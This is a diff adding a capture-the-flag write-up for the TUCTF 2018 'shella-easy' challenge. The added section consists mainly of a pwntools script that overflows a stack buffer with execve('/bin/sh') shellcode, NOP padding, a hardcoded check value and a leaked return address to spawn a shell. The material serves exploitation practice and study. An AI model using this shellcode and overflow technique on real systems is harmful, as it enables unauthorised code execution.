@@ -83,3 +83,30 @@ payload = shellcode + nops + p64(int(addr, 16))
 io.sendline(payload)
 io.interactive()
 ```
+
+### Tuctf 2018 shella-easy
+
+This challenge is the same as above except it has a built in stack canary.  
+
+```python3
+#!/usr/bin/env python3
+from pwn import *
+
+context.log_level = "debug"
+io = process("./shella-easy")
+
+# Save the leaked address
+io.recvuntil("have a ")
+addr = int(io.recvline().strip(b" with a side of fries thanks\n"), 16)
+
+offset = 64   # offset to the stack canary
+check = p32(0xdeadbeef)   # Value to set the canary
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+nops = b"\x90" * (offset - len(shellcode))
+
+# Shellcode, padding to the canary, the canary, padding to the leaked address, the leaked address
+payload = shellcode + nops + check + (b"\x90" * 8) + p32(addr) 
+
+io.sendline(payload)
+io.interactive()
+```
